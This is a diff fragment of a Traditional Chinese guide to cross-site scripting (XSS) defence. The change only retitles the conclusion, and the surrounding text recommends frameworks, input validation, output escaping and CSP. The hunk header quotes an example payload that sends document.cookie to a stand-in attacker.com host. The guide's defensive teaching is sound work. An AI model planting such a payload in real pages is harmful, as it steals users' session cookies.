@@ -456,5 +456,5 @@ document.location='http://attacker.com/steal.php?cookie='+document.cookie;
 * 使用 Web 安全框架
   -  使用 Django、Flask、Express.js 這類具備 XSS 防護的框架，減少手動防禦的錯誤機會。  
 
-### 結論  
+### 📌 總結  
 XSS 是一種常見且危險的攻擊方式，攻擊者可利用它來盜取用戶數據、篡改網頁內容或執行未經授權的操作。透過適當的輸入驗證、輸出轉義、使用 CSP 等安全策略，開發者可以有效防止 XSS 攻擊，提高網站的安全性。
